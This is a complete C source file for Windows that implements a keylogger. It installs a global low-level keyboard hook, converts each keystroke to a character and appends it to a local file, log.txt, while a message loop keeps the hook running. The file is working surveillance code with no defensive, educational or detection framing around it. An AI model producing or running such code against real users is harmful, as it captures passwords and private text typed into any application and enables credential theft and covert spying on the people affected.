#include <windows.h>
#include <stdio.h>

// Functions to log keystrokes
void logKeystroke(char key){
    FILE *file = fopen("log.txt", "a");
    if(file){
        fprintf(file,"%c", key);
        fclose(file);
    }
}

// Hook procedure to capture keystroke
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if(nCode >= 0 && wParam == WM_KEYDOWN){
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        char key = MapVirtualKey(kb->vkCode, MAPVK_VK_TO_CHAR);
        logKeystroke(key);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(){
    // Set a low-level system hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if(hook == NULL){
        printf("Failed to set hook\n");
        return 1;
    }

    // Message loop to keep the hook active
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook and exit
    UnhookWindowsHookEx(hook);
    return 0;
}